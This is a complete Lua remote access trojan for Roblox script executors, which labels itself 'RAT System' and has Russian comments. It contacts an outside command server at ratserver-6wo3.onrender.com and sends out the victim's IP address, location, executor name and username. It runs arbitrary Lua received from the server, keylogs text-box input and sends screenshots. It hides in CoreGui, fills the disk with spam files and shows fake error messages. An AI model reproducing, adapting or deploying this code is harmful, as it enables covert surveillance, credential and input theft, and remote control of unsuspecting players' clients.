local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local TextChatService = game:GetService("TextChatService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local CoreGui = game:GetService("CoreGui")

-- Конфигурация
local SERVER_URL = "https://ratserver-6wo3.onrender.com"
local player = Players.LocalPlayer

-- Системные переменные
local keyloggerEnabled = false
local keylogBuffer = ""
local lastSendTime = os.time()
local scriptHidden = false
local lastUserUpdate = 0

-- Безопасная проверка функций
local function safeCheck(funcName)
    if funcName == "writefile" then
        return writefile ~= nil
    elseif funcName == "readfile" then
        return readfile ~= nil
    elseif funcName == "identifyexecutor" then
        return identifyexecutor ~= nil
    elseif funcName == "request" then
        return (syn and syn.request) or (request) or (http and http.request)
    end
    return false
end

-- Безопасный HTTP-запрос
local function httpRequest(params)
    local requestFunc
    
    -- Проверяем доступные HTTP библиотеки
    if syn and syn.request then
        requestFunc = syn.request
    elseif request then
        requestFunc = request
    elseif http and http.request then
        requestFunc = http.request
    else
        warn("❌ HTTP библиотека не найдена")
        return nil
    end
    
    local success, response = pcall(requestFunc, params)
    if success then
        return response
    else
        warn("❌ Ошибка HTTP запроса: " .. tostring(response))
        return nil
    end
end

-- Безопасная функция для создания скриншота
local function captureScreenshot()
    if RunService:IsStudio() then
        return nil
    end
    
    local screenshot
    
    -- Проверяем доступные методы скриншотов
    if getgenv and getgenv().takescreenshot then
        screenshot = getgenv().takescreenshot()
    elseif screencap then
        screenshot = screencap()
    else
        warn("❌ Функция скриншота недоступна")
        return nil
    end
    
    if screenshot then
        local success, encoded = pcall(function()
            return HttpService:JSONEncode(screenshot)
        end)
        return success and encoded or nil
    end
    
    return nil
end

-- Функция отправки информации о пользователе
local function sendUserInfo()
    local currentTime = os.time()
    if currentTime - lastUserUpdate < 15 then
        return
    end
    
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end
    
    local success = pcall(function()
        local response = httpRequest({
            Url = SERVER_URL.."/users",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                player = playerName,
                place = placeName,
                executor = executor
            })
        })
        return response ~= nil
    end)
    
    if success then
        lastUserUpdate = currentTime
    end
end

-- Отправка уведомления при инжекте
local function sendInjectNotification()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s\nCity: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A", 
                ipInfo.city or "N/A"
            )
        end
    end

    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end
    
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "inject_notify",
            args = {playerName, placeName, ipData, executor}
        })
    })
end

-- Получение данных об оборудовании
local function getHardwareInfo()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A"
            )
        end
    end

    local fps = 0
    local ping = 0
    
    local success1, fpsValue = pcall(function()
        return math.floor(workspace:GetRealPhysicsFPS())
    end)
    if success1 then fps = fpsValue end
    
    local success2, pingValue = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    if success2 then ping = pingValue end

    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end

    local hardwareData = {
        player = playerName,
        game = placeName,
        fps = fps,
        ping = ping,
        executor = executor,
        ip_info = ipData
    }
    
    return hardwareData
end

-- Memory Spam функция (только если writefile доступен)
local function memorySpam(fileCount)
    if not safeCheck("writefile") then
        return 0
    end
    
    local successCount = 0
    
    for i = 1, fileCount do
        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
        
        local success = pcall(function()
            local bigContent = ""
            for j = 1, 100 do  -- Уменьшено для скорости
                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
                           string.rep("X", 100) .. "\n"  -- Уменьшен размер файла
            end
            
            writefile(filename, bigContent)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.1)  -- Уменьшена задержка
    end
    
    return successCount
end

-- Gallery Spam функция (только если writefile доступен)
local function gallerySpam(imageCount)
    if not safeCheck("writefile") then
        return 0
    end
    
    local successCount = 0
    
    for i = 1, imageCount do
        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. ".mp4"
        
        local success = pcall(function()
            -- Упрощенная версия без скачивания
            local content = "fake_video_content_" .. math.random(100000, 999999)
            writefile(filename, content)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.1)
    end
    
    return successCount
end

-- Выполнение Lua-кода
local function executeLua(code)
    local func, err = loadstring(code)
    if func then
        local success, result = pcall(func)
        if success then
            return "Успешно: " .. tostring(result)
        else
            return "Ошибка выполнения: " .. tostring(result)
        end
    else
        return "Ошибка компиляции: " .. tostring(err)
    end
end

-- Фейковая ошибка
local function showFakeError(message)
    local success, result = pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "FakeError"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
        frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBold
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        task.delay(10, function()
            gui:Destroy()
        end)
        
        return true
    end)
    
    return success
end

-- Всплывающее сообщение
local function showPopupMessage(message)
    local success, result = pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "PopupMessage"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.4, 0, 0.2, 0)
        frame.Position = UDim2.new(0.3, 0, 0.4, 0)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        frame.BorderColor3 = Color3.fromRGB(70, 70, 100)
        frame.BorderSizePixel = 2
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "📢 Сообщение:\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.Gotham
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        -- Анимация
        frame.BackgroundTransparency = 1
        textLabel.TextTransparency = 1
        
        local tweenIn = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0.1})
        local tweenTextIn = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 0})
        
        tweenIn:Play()
        tweenTextIn:Play()
        
        task.delay(7, function()
            local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
            local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
            
            tweenOut:Play()
            tweenTextOut:Play()
            
            tweenOut.Completed:Connect(function()
                pcall(function() gui:Destroy() end)
            end)
        end)
        
        return true
    end)
    
    return success
end

-- Скрытие скрипта
local function hideScript()
    if scriptHidden then return true end
    
    local success = pcall(function()
        if syn and syn.protect_gui then
            pcall(syn.protect_gui, script.Parent)
        end
        
        script.Name = "UI_"..tostring(math.random(10000,99999))
        
        if getgenv and getgenv().setthreadidentity then
            pcall(getgenv().setthreadidentity, 7)
        end
        
        if script.Parent ~= CoreGui then
            script.Parent = CoreGui
        end
    end)
    
    scriptHidden = success
    return success
end

-- Настройка кейлоггера
local function setupKeylogger()
    local success = pcall(function()
        UserInputService.TextBoxFocused:Connect(function(textBox)
            if keyloggerEnabled then
                textBox.FocusLost:Connect(function()
                    if textBox.Text and textBox.Text ~= "" then
                        keylogBuffer = keylogBuffer .. "[Input] " .. textBox.Text .. "\n"
                    end
                end)
            end
        end)
        return true
    end)
    return success
end

-- Чат-модуль (упрощенный)
local function setupChat()
    local success, result = pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "RatChat"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        screenGui.Enabled = false

        local chatFrame = Instance.new("Frame")
        chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
        chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        chatFrame.BackgroundTransparency = 0.3
        chatFrame.Active = true
        chatFrame.Draggable = true
        chatFrame.Parent = screenGui

        return {
            gui = screenGui,
            enabled = false
        }
    end)
    
    return success and result or nil
end

local chatSystem = setupChat()

-- Обработка команд
local function ExecuteCommand(cmd, args)
    local success, errorMsg = pcall(function()
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local root = character:FindFirstChild("HumanoidRootPart")

        if cmd == "chat" then
            if chatSystem then
                chatSystem.gui.Enabled = not chatSystem.gui.Enabled
                chatSystem.enabled = chatSystem.gui.Enabled
            end
        
        elseif cmd == "popup" then
            if args and args[1] then
                showPopupMessage(args[1])
            end
        
        elseif cmd == "print" then
            -- Тихая проверка связи
            print("📡 RAT: Проверка связи OK")
        
        elseif cmd == "kick" then
            player:Kick(args[1] or "Кикнут администратором")
        
        elseif cmd == "freeze" and humanoid then
            humanoid.WalkSpeed = 0
            task.delay(tonumber(args[1] or 5), function()
                if humanoid then humanoid.WalkSpeed = 16 end
            end)
        
        elseif cmd == "void" and root then
            root.CFrame = CFrame.new(0, -5000, 0)
        
        elseif cmd == "spin" and root then
            for i = 1, 20 do  -- Уменьшено количество итераций
                if root then
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
                    task.wait(0.1)
                end
            end
        
        elseif cmd == "fling" and root then
            root.Velocity = Vector3.new(0, 5000, 0)
        
        elseif cmd == "sit" and humanoid then
            humanoid.Sit = not humanoid.Sit
        
        elseif cmd == "dance" and humanoid then
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://35654637"
            local track = humanoid:LoadAnimation(anim)
            track:Play()
        
        elseif cmd == "blur" then
            local blur = Instance.new("BlurEffect")
            blur.Size = 24
            blur.Parent = Lighting
            task.delay(tonumber(args[1] or 5), function()
                if blur then blur:Destroy() end
            end)
        
        elseif cmd == "mute" then
            for _, sound in ipairs(SoundService:GetDescendants()) do
                if sound:IsA("Sound") then sound.Volume = 0 end
            end
        
        elseif cmd == "unmute" then
            for _, sound in ipairs(SoundService:GetDescendants()) do
                if sound:IsA("Sound") then sound.Volume = 1 end
            end
        
        elseif cmd == "playaudio" and args[1] then
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://"..args[1]
            sound.Parent = root or player
            sound:Play()
            sound.Ended:Connect(function()
                sound:Destroy()
            end)
        
        elseif cmd == "execute" then
            local result = executeLua(table.concat(args, " "))
            -- Можно отправить результат на сервер
        
        elseif cmd == "fakeerror" then
            showFakeError(table.concat(args, " "))
        
        elseif cmd == "screenshot" then
            local screenshotData = captureScreenshot()
            if screenshotData then
                httpRequest({
                    Url = SERVER_URL.."/screenshot",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        image = screenshotData
                    })
                })
            end
        
        elseif cmd == "keylog" then
            keyloggerEnabled = true
            keylogBuffer = ""
            lastSendTime = os.time()
        
        elseif cmd == "stopkeylog" then
            keyloggerEnabled = false
            if keylogBuffer ~= "" then
                httpRequest({
                    Url = SERVER_URL.."/keylog",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        logs = keylogBuffer
                    })
                })
            end
            keylogBuffer = ""
        
        elseif cmd == "hardware" then
            local hwInfo = getHardwareInfo()
            httpRequest({
                Url = SERVER_URL.."/hardware",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    player = player.Name,
                    data = hwInfo
                })
            })
        
        elseif cmd == "hide" then
            hideScript()
        
        -- SPAM КОМАНДЫ
        elseif cmd == "memory_spam" then
            local fileCount = tonumber(args[1]) or 50  -- Уменьшено по умолчанию
            
            task.spawn(function()
                local savedCount = memorySpam(fileCount)
                httpRequest({
                    Url = SERVER_URL.."/command",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        command = "spam_completed",
                        args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
                    })
                })
            end)
        
        elseif cmd == "gallery_spam" then
            local imageCount = tonumber(args[1]) or 5  -- Уменьшено по умолчанию
            
            task.spawn(function()
                local savedCount = gallerySpam(imageCount)
                httpRequest({
                    Url = SERVER_URL.."/command",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        command = "spam_completed",
                        args = {"gallery_spam", "Сохранено "..savedCount.." файлов из "..imageCount}
                    })
                })
            end)
        
        end
    end)
    
    if not success then
        warn("❌ Ошибка выполнения команды " .. cmd .. ": " .. tostring(errorMsg))
    end
end

-- Функция проверки команд
local function checkCommands()
    local success, response = pcall(function()
        return httpRequest({
            Url = SERVER_URL.."/data",
            Method = "GET"
        })
    end)
    
    if success and response and response.Body then
        local success, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and data and data.command and data.command ~= "" then
            ExecuteCommand(data.command, data.args or {})
            return true
        end
    end
    return false
end

-- Инициализация с безопасной проверкой
local function initialize()
    print("🚀 RAT System: Инициализация...")
    
    -- Отправляем уведомление об инжекте
    pcall(sendInjectNotification)
    
    -- Настраиваем кейлоггер
    pcall(setupKeylogger)
    
    -- Пытаемся скрыть скрипт
    pcall(hideScript)
    
    print("✅ RAT System: Инициализация завершена")
end

-- Главный цикл
local function mainLoop()
    while task.wait(2) do  -- Увеличена задержка для стабильности
        local hasCommand = pcall(checkCommands)
        
        -- Отправляем информацию о пользователе каждые 15 секунд
        if os.time() - lastUserUpdate >= 15 then
            pcall(sendUserInfo)
        end
        
        -- Отправка логов кейлоггера
        if keyloggerEnabled and os.time() - lastSendTime >= 300 then
            if keylogBuffer ~= "" then
                pcall(function()
                    httpRequest({
                        Url = SERVER_URL.."/keylog",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            logs = keylogBuffer
                        })
                    })
                    keylogBuffer = ""
                end)
            end
            lastSendTime = os.time()
        end
    end
end

-- Запуск системы
pcall(initialize)
pcall(mainLoop)

print("🎯 RAT System: Запущен и работает")
